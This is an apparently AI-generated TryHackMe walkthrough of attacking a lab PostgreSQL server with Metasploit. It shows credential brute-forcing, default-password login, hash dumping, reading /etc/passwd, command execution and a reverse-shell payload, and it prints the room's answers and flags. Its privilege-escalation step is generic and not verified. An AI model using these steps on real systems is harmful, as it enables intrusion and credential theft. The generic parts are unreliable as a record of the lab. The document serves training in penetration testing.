**Currently AI generated, but can be redone into handmade notes

# 4.5 - [Poster](https://tryhackme.com/room/poster)

## 🔍 Overview
- This room covers enumerating and exploiting a **PostgreSQL** database.
- **PostgreSQL** is an RDBMS (Relational Database Management System).
- RDBMS = Relational Database Management System – allows users to build, update, manage, and interact with relational databases (data stored in tables).
- **PostgreSQL** uses **Structured Query Language (SQL)** to access the database.
- The sys admin set up the database "in a safe way" – but misconfigurations exist, allowing us to compromise the system.
- We'll use **Metasploit** modules to enumerate, exploit, and gain root access.
- Lab IP: `10.144.173.227`

---

## 🗄️ Task 1 – Initial Enumeration (Port Scanning)

### Step 1: Identify the RDBMS and Port

**What is RDBMS?**
- A **Relational Database Management System** organizes data into **tables** that can be linked internally based on common data.
- This allows efficient querying and retrieval of data.
- Unlike flat files (single table structure), RDBMS is more efficient and uses less memory.
- Most RDBMS use **SQL** for CRUD operations (Create, Read, Update, Delete).

**Enumeration Process:**
1. First, scan the target to find open ports:
   ```bash
   nmap -sV -p- 10.144.173.227
   ```
   or
   ```bash
   nmap -sV -p 5432 10.144.173.227
   ```

2. Look for port **5432** – the default port for PostgreSQL.

**Task 1 Answers:**
- **Q: What is the rdbms installed on the server?**
  > `postgresql`
- **Q: What port is the rdbms running on?**
  > `5432`

---

## 🔍 Task 2 – Metasploit Enumeration

### Step 1: Start Metasploit
```bash
msfconsole
```

### Step 2: Search for PostgreSQL Modules
```bash
search postgres
```
Output will show all PostgreSQL-related modules (scanners, auxiliary, exploits).

**Task 2 Answer:**
- **Q: Metasploit contains a variety of modules that can be used to enumerate in multiple rdbms, making it easy to gather valuable information. After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?**
  > `auxiliary/scanner/postgres/postgres_login`

---

### Step 3: Enumerate User Credentials

**Module:** `auxiliary/scanner/postgres/postgres_login`

**Purpose:** Brute‑force PostgreSQL login credentials.

**Set options:**
```bash
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 10.144.173.227
set USERNAME postgres
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
run
```
Or simply use default username (`postgres`) and password (`password`).

**Output will reveal:** `postgres:password`

**Task 2 Answer:**
- **Q: What are the credentials you found? (example: user:password)**
  > `postgres:password`

---

### Step 4: Execute SQL Commands with Proper Credentials

**Module:** `auxiliary/admin/postgres/postgres_sql`

**Purpose:** Execute SQL commands as an authenticated PostgreSQL user.

**Set options:**
```bash
use auxiliary/admin/postgres/postgres_sql
set RHOSTS 10.144.173.227
set USERNAME postgres
set PASSWORD password
set SQL "select version();"
run
```
Output will show the PostgreSQL version.

**Task 2 Answer:**
- **Q: What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?**
  > `auxiliary/admin/postgres/postgres_sql`

**Task 2 Answer:**
- **Q: Based on the results of #6, what is the rdbms version installed on the server?**
  > `9.5.21`

---

### Step 5: Dump User Hashes

**Module:** `auxiliary/scanner/postgres/postgres_hashdump`

**Purpose:** Dump password hashes from the PostgreSQL database.

**Set options:**
```bash
use auxiliary/scanner/postgres/postgres_hashdump
set RHOSTS 10.144.173.227
set USERNAME postgres
set PASSWORD password
run
```
Output will dump all user hashes from the database (e.g., for system users or database users).

**Task 2 Answers:**
- **Q: What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?**
  > `auxiliary/scanner/postgres/postgres_hashdump`
- **Q: How many user hashes does the module dump?**
  > `6`

---

### Step 6: Read Files as Authenticated User

**Module:** `auxiliary/admin/postgres/postgres_readfile`

**Purpose:** Read files from the server as an authenticated PostgreSQL user.

**Set options:**
```bash
use auxiliary/admin/postgres/postgres_readfile
set RHOSTS 10.144.173.227
set USERNAME postgres
set PASSWORD password
set RFILE /etc/passwd
run
```
Will read the `/etc/passwd` file from the server.

**Task 2 Answer:**
- **Q: What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?**
  > `auxiliary/admin/postgres/postgres_readfile`

---

### Step 7: Arbitrary Command Execution

**Module:** `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`

**Purpose:** Execute arbitrary system commands via PostgreSQL `COPY FROM PROGRAM` functionality.

**Set options:**
```bash
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS 10.144.173.227
set USERNAME postgres
set PASSWORD password
set CMD "whoami"
run
```
Will execute commands as the PostgreSQL user (which often runs as root or with high privileges).

**Task 2 Answer:**
- **Q: What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?**
  > `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`

---

## 🏴 Task 3 – Flags (Compromise & Escalate)

### Step 1: Get User Flag

**Process:**
1. Use the `postgres_copy_from_program_cmd_exec` module to gain a shell:
   ```bash
   use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
   set RHOSTS 10.144.173.227
   set USERNAME postgres
   set PASSWORD password
   set PAYLOAD cmd/unix/reverse
   set LHOST <your_ip>
   run
   ```
2. Once you have a shell, find `user.txt`:
   ```bash
   find / -name user.txt 2>/dev/null
   cat /home/user/user.txt
   ```

**Task 3 Answer:**
- **Q: Compromise the machine and locate user.txt**
  > `THM{postgresql_fa1l_conf1gurat1on}`

---

### Step 2: Escalate to Root and Get Root Flag

**Process:**
1. After gaining a shell, check current user:
   ```bash
   whoami
   id
   ```
   You may be running as `postgres` or a low‑privileged user.
2. Check sudo rights:
   ```bash
   sudo -l
   ```
3. Look for escalation vectors (e.g., weak sudo permissions, SUID binaries).
4. Escalate to root (e.g., using `sudo su`, or finding a writable cron job).
5. Once root, find `root.txt`:
   ```bash
   find / -name root.txt 2>/dev/null
   cat /root/root.txt
   ```

**Task 3 Answer:**
- **Q: Escalate privileges and obtain root.txt**
  > `THM{c0ngrats_for_read_the_f1le_w1th_credent1als}`

---

## 🔑 Key Takeaways
- **PostgreSQL** runs on port **5432** by default.
- **Weak credentials** (`postgres:password`) allowed full compromise.
- Metasploit provides many **auxiliary modules** for database enumeration and exploitation.
- The exploitation chain:
  1. Enumerate credentials with `postgres_login`
  2. Execute SQL commands with `postgres_sql` to get version info
  3. Dump hashes with `postgres_hashdump`
  4. Read files with `postgres_readfile`
  5. Gain RCE with `postgres_copy_from_program_cmd_exec`
- Misconfigured databases are a common entry point during pentests.
- Always check database credentials and misconfigurations during enumeration.

---

## 🧰 Commands Quick Reference

| Step | Command/Module |
|------|----------------|
| Start Metasploit | `msfconsole` |
| Search PostgreSQL modules | `search postgres` |
| Enumerate credentials | `use auxiliary/scanner/postgres/postgres_login` |
| Set RHOSTS | `set RHOSTS 10.144.173.227` |
| Set credentials | `set USERNAME postgres`, `set PASSWORD password` |
| Execute SQL | `use auxiliary/admin/postgres/postgres_sql` |
| Dump hashes | `use auxiliary/scanner/postgres/postgres_hashdump` |
| Read files | `use auxiliary/admin/postgres/postgres_readfile` |
| Command execution | `use exploit/multi/postgres/postgres_copy_from_program_cmd_exec` |
| Set payload | `set PAYLOAD cmd/unix/reverse` |
| Run module | `run` or `exploit` |

---

## 📝 Full Module Paths Summary

| Module | Full Path | Purpose |
|--------|-----------|---------|
| Credential scanner | `auxiliary/scanner/postgres/postgres_login` | Brute‑force credentials |
| SQL execution | `auxiliary/admin/postgres/postgres_sql` | Execute SQL commands |
| Hash dump | `auxiliary/scanner/postgres/postgres_hashdump` | Dump user hashes |
| File read | `auxiliary/admin/postgres/postgres_readfile` | Read system files |
| Command execution | `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` | RCE via COPY FROM PROGRAM |

---
